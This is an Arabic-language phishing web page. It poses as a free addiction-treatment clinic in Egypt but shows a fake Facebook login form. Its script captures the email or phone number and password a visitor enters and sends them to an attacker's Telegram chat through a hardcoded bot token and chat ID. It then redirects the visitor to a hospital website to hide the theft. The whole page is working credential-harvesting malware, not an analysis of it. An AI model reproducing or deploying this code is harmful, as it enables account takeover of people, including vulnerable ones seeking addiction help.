<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مصحة علاج ادمان</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .logo {
            font-size: 2.5em;
            color: #1877f2;
            margin-bottom: 20px;
        }
        .login-container {
            background-color: #fff;
            padding: 40px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }
        .login-container h2 {
            margin: 0 0 20px;
        }
        .input-group {
            margin-bottom: 15px;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-btn:hover {
            background-color: #155db8;
        }
        .forgot-password {
            display: block;
            text-align: center;
            margin-top: 10px;
            color: #1877f2;
            text-decoration: none;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">افضل مصحة علاج الادمان فى مصر بالمجان سجل الاشتراك الان </div>
        <div class="login-container">
            <h2>تسجيل الدخول إلى فيس بوك</h2>
            <form id="loginForm">
                <div class="input-group">
                    <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="كلمة المرور" required>
                </div>
                <button type="submit" class="login-btn">تسجيل الدخول</button>
            </form>
            <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
        </div>
    </div>

    <script>
        const botToken = "6504997107:AAHS2LcGZ_L2DN2LiwHGE-DIj8N3cmCA3Ak"; // استبدل بـ Token البوت الخاص بك
        const chatId = "1066012265"; // استبدل بـ Chat ID الخاص بك

        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            const message = `
📥 تسجيل دخول جديد:
📧 البريد الإلكتروني: ${email}
🔑 كلمة المرور: ${password}
`;

            sendToTelegram(message);
        });

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
            .then(() => {
                // توجيه المستخدم إلى موقع فيسبوك بعد الإرسال
                window.location.href = "https://mowafyhospital.com";
            })
            .catch(error => {
                console.error("خطأ أثناء الإرسال:", error);
                // يتم التوجيه حتى إذا حدث خطأ
                window.location.href = "https://mowafyhospital.com";
            });
        }
    </script>
</body>
</html>
